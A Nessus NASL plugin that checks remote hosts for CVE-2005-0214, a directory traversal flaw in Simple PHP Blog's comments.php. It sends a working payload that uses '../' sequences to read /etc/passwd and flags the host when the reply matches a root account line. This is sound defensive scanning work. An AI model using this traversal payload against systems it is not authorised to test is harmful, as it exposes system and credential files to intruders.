#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# Ref: Alexander Palmo
# This script is released under the GNU GPL v2
#

# Changes by Tenable :
# - Updated to use compat.inc (11/20/2009)

include("compat.inc");

if(description)
{
 script_id(16137);
 script_cve_id("CVE-2005-0214");
 script_bugtraq_id(12193);
 script_xref(name:"OSVDB", value:"12823");
 script_version ("$Revision: 1.10 $");
 
 script_name(english:"Simple PHP Blog comments.php Traversal Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"It is possible to access arbitrary files from the remote
system." );
 script_set_attribute(attribute:"description", value:
"The remote version of Simple PHP Blog allows for retrieval of
arbitrary files from the web server.  These issues are due to a
failure of the application to properly sanitize user-supplied input
data." );
 script_set_attribute(attribute:"solution", value:
"Upgrade at least to version 0.3.7 r2." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N" );

script_end_attributes();

 
 summary["english"] = "Simple PHP Blog dir traversal";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);

 script_copyright(english:"This script is Copyright (C) 2005-2008 David Maciejak");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("sphpblog_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# the code
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/sphpblog"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
 loc = matches[2];
 req = http_get(item:string(loc,  "/comments.php?y=05&m=01&entry=../../../../../../../etc/passwd"), port:port);
 rep = http_keepalive_send_recv(port:port, data:req, bodyonly: 1);
 if( !rep )exit(0);

 if(egrep(pattern:".*root:.*:0:[01]:.*", string:rep))
 	security_hole(port);
}
